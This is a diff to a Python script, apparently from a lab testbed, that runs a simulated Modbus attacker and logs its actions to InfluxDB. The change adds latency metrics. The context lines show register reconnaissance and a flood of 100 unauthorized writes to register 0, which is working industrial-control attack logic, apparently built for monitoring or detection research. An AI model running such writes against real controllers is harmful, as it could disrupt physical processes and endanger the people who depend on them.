@@ -12,13 +12,18 @@ _influx = InfluxDBClient(url=INFLUX_URL, token=INFLUX_TOKEN, org=INFLUX_ORG)
 _write_api = _influx.write_api(write_options=SYNCHRONOUS)
 
 
-def push_metric(action, value):
+def push_metric(action, field_name, value):
+    """Push metric - use float for latency, int for register"""
     try:
+        if field_name == "latency":
+            field_value = float(value)
+        else:
+            field_value = int(value)
         point = (
             Point("modbus")
             .tag("container", "modbus-attacker")
             .tag("action", action)
-            .field("register_value", int(value))
+            .field(field_name, field_value)
         )
         _write_api.write(bucket=INFLUX_BUCKET, record=point)
     except Exception as e:
@@ -49,7 +54,7 @@ def run_modbus_attacker():
             else:
                 elapsed = time.time() - start_time
                 print(f" [+] Quét thành công {len(result.registers)} thanh ghi trong {elapsed:.2f}s")
-                push_metric("attack_recon", len(result.registers))
+                push_metric("attack_recon", "register_value", len(result.registers))
         except Exception as e:
             print(f" Lỗi ngoại lệ lúc quét: {e}")
             
@@ -61,11 +66,14 @@ def run_modbus_attacker():
         
         for i in range(100):
             try:
+                start_time = time.time()
                 res = client.write_register(0, 99, device_id=1)
+                latency = (time.time() - start_time) * 1000  # ms
+                
                 if not res.isError():
                     success_count += 1
-                    # Ghi nhận metric tần suất cao
-                    push_metric("write", 99)
+                    push_metric("write", "latency", latency)
+                    push_metric("write", "register_value", 99)
                 
                 # Sleep cực ngắn để tạo lưu lượng cao (flood)
                 time.sleep(0.05) 
